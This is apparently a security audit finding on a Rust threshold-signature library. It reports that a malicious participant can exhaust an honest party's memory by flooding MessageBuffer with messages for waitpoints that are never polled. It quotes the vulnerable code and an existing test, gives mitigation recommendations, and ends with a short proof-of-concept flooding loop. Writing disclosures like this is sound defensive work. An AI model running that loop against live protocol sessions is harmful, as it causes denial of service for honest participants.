### Title
Unbounded `MessageBuffer` Growth via Malicious Participant Message Injection — (File: `src/protocol/internal.rs`)

---

### Summary

The `MessageBuffer` inside `Comms` accepts and permanently stores incoming messages keyed by arbitrary `(channel_tag, waitpoint)` pairs with no size cap, no sender validation against the participant list, and no per-sender quota. A malicious participant can flood an honest party's protocol instance with messages for waitpoints the honest code never polls, growing the internal `HashMap` without bound and exhausting process memory. The codebase itself ships a test that explicitly proves the attack path.

---

### Finding Description

`Comms::push_message` is the sole ingestion point for all externally delivered messages:

```rust
// src/protocol/internal.rs  line 286-296
fn push_message(&self, from: Participant, message: MessageData) {
    if message.len() < MessageHeader::LEN {
        return;
    }
    let Some(header) = MessageHeader::from_bytes(&message) else {
        return;
    };
    self.incoming.push(header, from, message);   // ← unconditional store
}
```

The only guards are a minimum-length check and a header-parse check. There is no validation that `from` belongs to the current participant set, no check that the `waitpoint` encoded in the header is one the protocol will ever poll, and no limit on the total number of entries.

The backing store is a `HashMap` with no capacity ceiling:

```rust
// src/protocol/internal.rs  line 222-224
struct MessageBuffer {
    messages: Arc<std::sync::Mutex<HashMap<MessageHeader, SubMessageQueue>>>,
}
```

Each `SubMessageQueue` is backed by `futures::channel::mpsc::unbounded()`:

```rust
// src/protocol/internal.rs  line 206
let (sender, receiver) = futures::channel::mpsc::unbounded();
```

Every distinct `(channel_tag, waitpoint)` pair the attacker encodes in a crafted message header creates a new `HashMap` entry that is never evicted, because `MessageBuffer::pop` only reads from entries the honest protocol code explicitly awaits — entries for attacker-chosen waitpoints are never consumed.

The public entry point is the `Protocol` trait method:

```rust
// src/protocol/mod.rs  line 64
fn message(&mut self, from: Participant, data: MessageData);
```

which delegates directly to `push_message`. Any caller of the library that faithfully forwards network bytes to `protocol.message()` — as the library's documented usage requires — will feed attacker bytes straight into the unbounded buffer.

The repository's own test suite acknowledges and demonstrates the attack:

```rust
// src/protocol/internal.rs  line 532-554
fn attacker_can_fill_message_buffer_with_unused_waitpoints() {
    let comms = Comms::new();
    let attacker = Participant::from(99_u32);
    let attack_count = 512_u64;
    for i in 0..attack_count {
        let header =
            MessageHeader::new(ChannelTag::root_shared()).with_waitpoint(1_000_000 + i);
        let mut message = header.to_bytes().to_vec();
        message.extend_from_slice(&i.to_le_bytes());
        // Attacker injects messages for waitpoints the honest code never polls.
        comms.push_message(attacker, message);
    }
    // All 512 entries accumulate — none are evicted.
    assert!(messages.len() == usize::try_from(attack_count).unwrap());
}
```

The test name is `attacker_can_fill_message_buffer_with_unused_waitpoints` — the developers identified the attack surface but left no mitigation in place.

---

### Impact Explanation

A malicious participant sends a continuous stream of messages whose headers encode fresh, never-polled waitpoints (e.g., `1_000_000`, `1_000_001`, …). Each message creates a new `HashMap` entry. Because the honest protocol code never awaits those waitpoints, the entries accumulate indefinitely. At scale this exhausts the heap of the honest party's process, causing an OOM kill or swap exhaustion. The honest party cannot complete DKG, resharing, refresh, presign, sign, or CKD — all of which rely on the same `Comms`/`MessageBuffer` infrastructure — for as long as the attack continues.

**Impact: Medium** — Griefing / resource-exhaustion by a malicious participant causing unbounded memory growth beyond documented behavior. The README documents indefinite *waiting* as intentional, but does not document or disclaim unbounded memory accumulation from adversarial message injection.

---

### Likelihood Explanation

The attack requires only that the adversary be a participant (or be able to impersonate one at the network layer, since `push_message` does not authenticate `from`). No cryptographic material, no special privilege, and no coordination with other parties is needed. The attacker simply sends a high volume of messages with monotonically increasing waitpoint values. The attack is trivially scriptable and can be sustained indefinitely.

**Likelihood: Medium** — Requires participation in a live protocol session, but no cryptographic capability beyond that.

---

### Recommendation

1. **Cap `MessageBuffer` size**: Reject `push_message` calls once the total number of buffered entries (or the total buffered byte count) exceeds a configurable limit.
2. **Validate `from` against the participant list**: `push_message` should accept a `&ParticipantList` and silently drop messages from unknown senders before they enter the buffer.
3. **Bound per-sender, per-waitpoint quota**: Allow at most one (or a small constant number of) buffered messages per `(from, header)` pair, matching the protocol's actual message-per-round expectations.
4. **Evict stale entries**: After a waitpoint is consumed by `pop`, remove its `HashMap` entry to reclaim memory.

---

### Proof of Concept

The existing test at `src/protocol/internal.rs:532–554` is a self-contained proof of concept. To scale it to an OOM condition, replace `attack_count = 512` with an arbitrarily large value and run it inside any live protocol session:

```rust
// Attacker loop — runs concurrently with an honest DKG/sign session
for i in 0u64.. {
    let header = MessageHeader::new(ChannelTag::root_shared())
        .with_waitpoint(1_000_000 + i);
    let mut msg = header.to_bytes().to_vec();
    msg.extend_from_slice(&[0u8; 64]); // arbitrary payload
    // Delivered via the public Protocol::message() API
    honest_protocol.message(attacker_id, msg);
}
```
